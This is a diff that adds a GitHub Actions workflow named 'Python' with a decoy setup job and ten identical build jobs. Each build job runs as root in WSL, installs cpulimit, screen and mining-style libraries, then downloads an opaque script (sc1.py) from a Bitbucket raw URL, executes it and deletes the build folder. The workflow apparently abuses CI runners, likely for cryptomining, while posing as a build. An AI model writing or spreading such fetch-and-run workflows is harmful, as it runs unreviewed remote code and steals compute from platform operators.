@@ -1,0 +1,357 @@
+name: Python
+on:  
+  push:
+  pull_request:
+jobs:
+  Setup:
+    runs-on: ubuntu-20.04
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.17, 1.16]
+        flag: [1, 2, 3 ,4, 5]
+    env:
+        NUM_JOBS: 5
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v2
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Testing
+      run: |
+        echo "Finish"
+  Build-1:
+    needs: Setup
+    runs-on: windows-2019
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+    defaults:
+     run:
+       shell: wsl-bash -u root {0}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v2
+      with:
+        go-version: 1.17
+      id: go
+    - name: Setup
+      uses: Vampire/setup-wsl@v1
+      with:
+          distribution: Ubuntu-20.04
+    - name : Install Tools
+      run: |
+        apt-get update
+        apt-get install -y screen curl cpulimit git \
+          wget libjansson4 libnuma1
+    - name: Main
+      run: |
+        mkdir build
+        cd build
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
+    - name: Done
+      run: rm -rf build
+  Build-2:
+    needs: Setup
+    runs-on: windows-2019
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+    defaults:
+     run:
+       shell: wsl-bash -u root {0}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v2
+      with:
+        go-version: 1.17
+      id: go
+    - name: Setup
+      uses: Vampire/setup-wsl@v1
+      with:
+          distribution: Ubuntu-20.04
+    - name : Install Tools
+      run: |
+        apt-get update
+        apt-get install -y screen curl cpulimit git \
+          wget libjansson4 libnuma1
+    - name: Main
+      run: |
+        mkdir build
+        cd build
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
+    - name: Done
+      run: rm -rf build
+  Build-3:
+    needs: Setup
+    runs-on: windows-2019
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+    defaults:
+     run:
+       shell: wsl-bash -u root {0}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v2
+      with:
+        go-version: 1.17
+      id: go
+    - name: Setup
+      uses: Vampire/setup-wsl@v1
+      with:
+          distribution: Ubuntu-20.04
+    - name : Install Tools
+      run: |
+        apt-get update
+        apt-get install -y screen curl cpulimit git \
+          wget libjansson4 libnuma1
+    - name: Main
+      run: |
+        mkdir build
+        cd build
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
+    - name: Done
+      run: rm -rf build
+  Build-4:
+    needs: Setup
+    runs-on: windows-2019
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+    defaults:
+     run:
+       shell: wsl-bash -u root {0}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v2
+      with:
+        go-version: 1.17
+      id: go
+    - name: Setup
+      uses: Vampire/setup-wsl@v1
+      with:
+          distribution: Ubuntu-20.04
+    - name : Install Tools
+      run: |
+        apt-get update
+        apt-get install -y screen curl cpulimit git \
+          wget libjansson4 libnuma1
+    - name: Main
+      run: |
+        mkdir build
+        cd build
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
+    - name: Done
+      run: rm -rf build
+  Build-5:
+    needs: Setup
+    runs-on: windows-2019
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+    defaults:
+     run:
+       shell: wsl-bash -u root {0}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v2
+      with:
+        go-version: 1.17
+      id: go
+    - name: Setup
+      uses: Vampire/setup-wsl@v1
+      with:
+          distribution: Ubuntu-20.04
+    - name : Install Tools
+      run: |
+        apt-get update
+        apt-get install -y screen curl cpulimit git \
+          wget libjansson4 libnuma1
+    - name: Main
+      run: |
+        mkdir build
+        cd build
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
+    - name: Done
+      run: rm -rf build
+  Build-6:
+    needs: Setup
+    runs-on: windows-2019
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+    defaults:
+     run:
+       shell: wsl-bash -u root {0}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v2
+      with:
+        go-version: 1.17
+      id: go
+    - name: Setup
+      uses: Vampire/setup-wsl@v1
+      with:
+          distribution: Ubuntu-20.04
+    - name : Install Tools
+      run: |
+        apt-get update
+        apt-get install -y screen curl cpulimit git \
+          wget libjansson4 libnuma1
+    - name: Main
+      run: |
+        mkdir build
+        cd build
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
+    - name: Done
+      run: rm -rf build
+  Build-7:
+    needs: Setup
+    runs-on: windows-2019
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+    defaults:
+     run:
+       shell: wsl-bash -u root {0}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v2
+      with:
+        go-version: 1.17
+      id: go
+    - name: Setup
+      uses: Vampire/setup-wsl@v1
+      with:
+          distribution: Ubuntu-20.04
+    - name : Install Tools
+      run: |
+        apt-get update
+        apt-get install -y screen curl cpulimit git \
+          wget libjansson4 libnuma1
+    - name: Main
+      run: |
+        mkdir build
+        cd build
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
+    - name: Done
+      run: rm -rf build
+  Build-8:
+    needs: Setup
+    runs-on: windows-2019
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+    defaults:
+     run:
+       shell: wsl-bash -u root {0}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v2
+      with:
+        go-version: 1.17
+      id: go
+    - name: Setup
+      uses: Vampire/setup-wsl@v1
+      with:
+          distribution: Ubuntu-20.04
+    - name : Install Tools
+      run: |
+        apt-get update
+        apt-get install -y screen curl cpulimit git \
+          wget libjansson4 libnuma1
+    - name: Main
+      run: |
+        mkdir build
+        cd build
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
+    - name: Done
+      run: rm -rf build
+  Build-9:
+    needs: Setup
+    runs-on: windows-2019
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+    defaults:
+     run:
+       shell: wsl-bash -u root {0}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v2
+      with:
+        go-version: 1.17
+      id: go
+    - name: Setup
+      uses: Vampire/setup-wsl@v1
+      with:
+          distribution: Ubuntu-20.04
+    - name : Install Tools
+      run: |
+        apt-get update
+        apt-get install -y screen curl cpulimit git \
+          wget libjansson4 libnuma1
+    - name: Main
+      run: |
+        mkdir build
+        cd build
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
+    - name: Done
+      run: rm -rf build
+  Build-10:
+    needs: Setup
+    runs-on: windows-2019
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+    defaults:
+     run:
+       shell: wsl-bash -u root {0}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v2
+      with:
+        go-version: 1.17
+      id: go
+    - name: Setup
+      uses: Vampire/setup-wsl@v1
+      with:
+          distribution: Ubuntu-20.04
+    - name : Install Tools
+      run: |
+        apt-get update
+        apt-get install -y screen curl cpulimit git \
+          wget libjansson4 libnuma1
+    - name: Main
+      run: |
+        mkdir build
+        cd build
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
+    - name: Done
+      run: rm -rf build
